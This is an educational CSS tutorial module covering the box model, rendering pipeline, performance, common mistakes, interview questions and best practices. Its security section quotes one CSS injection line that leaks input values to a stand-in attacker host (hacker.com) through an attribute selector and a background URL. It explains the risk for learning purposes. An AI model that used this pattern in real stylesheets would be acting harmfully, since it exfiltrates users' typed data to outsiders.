# Module 02: CSS (Cascading Style Sheets)

## 1. Concept Overview
CSS is the styling language of the web. While HTML provides the structure, CSS dictates the visual presentation (colors, fonts, layouts, animations). The "Cascading" part refers to the rules governing how overlapping styles are prioritized and applied to an element.

## 2. Theory from Scratch
- **Selectors:** How you target HTML elements. By tag (`p`), class (`.button`), ID (`#header`), or state (`:hover`).
- **The Box Model:** Every element in CSS is a rectangular box consisting of:
  - **Content:** The actual text/image.
  - **Padding:** Transparent space inside the border.
  - **Border:** The line surrounding the padding.
  - **Margin:** Transparent space outside the border.
- **Specifics:** How the browser resolves conflicts when multiple rules target the same element. (Inline style > ID > Class > Tag).
- **Positioning:** Static (default), Relative (shifted from normal flow), Absolute (removed from flow, placed relative to nearest positioned ancestor), Fixed (viewport-relative), Sticky (toggles between relative/fixed based on scroll).
- **Layout Systems:**
  - **Flexbox:** 1-dimensional layout (rows *or* columns). Perfect for alignment and distribution of space.
  - **Grid:** 2-dimensional layout (rows *and* columns). Perfect for complex page structures.

## 3. Internal Working (Under the Hood)
As the HTML parser builds the DOM, the browser concurrently requests any linked CSS files. It parses these files into the **CSSOM (CSS Object Model)**. 

1. **Calculate Styles:** The browser applies the cascade rules to determine the exact computed style for every DOM node.
2. **Render Tree Construction:** It combines the DOM and CSSOM to form a Render Tree (omitting invisible nodes like `<head>` or those with `display: none`).
3. **Layout (Reflow):** Computes the exact geometric dimensions and position of every box on the viewport.
4. **Paint:** Fills in pixels (colors, images, borders, text).
5. **Composite:** Draws elements in the correct stacking order (z-index) onto the GPU.

## 4. Why it is used in Production
Raw HTML is unstyled user-agent text, completely unacceptable for modern consumer applications. CSS allows for responsive design (adapting to mobile, tablet, desktop) using Media Queries, ensuring a seamless user experience across thousands of device types without rewriting code.

## 5. Architecture Diagrams

**The Box Model:**
```text
+------------------------------------+
|               Margin               |
|  +------------------------------+  |
|  |            Border            |  |
|  |  +------------------------+  |  |
|  |  |         Padding        |  |  |
|  |  |  +------------------+  |  |  |
|  |  |  |     Content      |  |  |  |
|  |  |  +------------------+  |  |  |
|  |  +------------------------+  |  |
|  +------------------------------+  |
+------------------------------------+
```

## 6. Performance Considerations
- **Avoid Expensive Properties:** Animating `margin`, `padding`, `width`, or `height` triggers a **Layout** recalculation for the entire page (very expensive, causes janky 30fps scrolling).
- **Animate Cheaply:** Only animate `transform` (translate, scale, rotate) and `opacity`. These are handed off to the Compositor thread on the GPU and run at a silky 60fps.
- **CSS Selectors:** Browsers read selectors right-to-left. Deeply nested selectors (e.g., `ul li div a span.active`) are computationally expensive. Prefer shallow class names (like BEM methodology).

## 7. Security Considerations
While CSS isn't a programming language with logic, it can be abused:
- **CSS Injection / Keylogging:** By dynamically tracking the width of input fields or matching attribute selectors (e.g., `input[value^="a"] { background: url('http://hacker.com?key=a') }`), attackers can theoretically extract data if user input dictates CSS blindly.

## 8. Common Mistakes
- **Box-Sizing Confusion:** By default, width/height only apply to the content box. Adding padding increases the element's actual footprint, breaking layouts. (Fix: ALWAYS use `* { box-sizing: border-box; }`).
- **Z-Index Wars:** Trying to fix overlapping issues by setting `z-index: 999999`. Z-index only works relative to the element's **Stacking Context**. If a parent has a lower z-index than another container, no amount of `9999` on the child will fix it.
- **Margin Collapse:** Vertical margins of adjacent block elements combine (collapse) into a single margin equal to the largest value. This often trips up beginners.

## 9. Interview Questions
1. **Q:** What is the difference between `display: none` and `visibility: hidden`?
   **A:** `display: none` completely removes the element from the document flow (it takes up zero space, triggers a layout recalculation). `visibility: hidden` makes the element invisible, but it still occupies physical space in the layout.
2. **Q:** Explain CSS Specificity.
   **A:** Specificity determines which CSS rule wins. It's calculated as (Inline Styles, IDs, Classes/Attributes/Pseudo-classes, Elements/Pseudo-elements). `!important` instantly overrides all normal specificity rules.
3. **Q:** What is a media query? Give an example.
   **A:** A rule that applies CSS only when specific conditions are met (like screen width). `@media (max-width: 768px) { /* mobile styles here */ }`.

## 10. Production-Level Best Practices
- **Variables / Custom Properties:** Always use CSS variables (`:root { --primary-color: #3b82f6; }`) to maintain a single source of truth for your design system, enabling instant dark-mode switching.
- **Architecture Methodology:** Use conventions like **BEM** (Block-Element-Modifier: `.card__title--large`) or utility-first frameworks (TailwindCSS) to prevent global scope pollution on massive teams.
- **Mobile First:** Write default styles for mobile screens, then use `min-width` media queries to enhance the layout for tablets and desktops. It prevents overriding complex desktop rules for mobile.
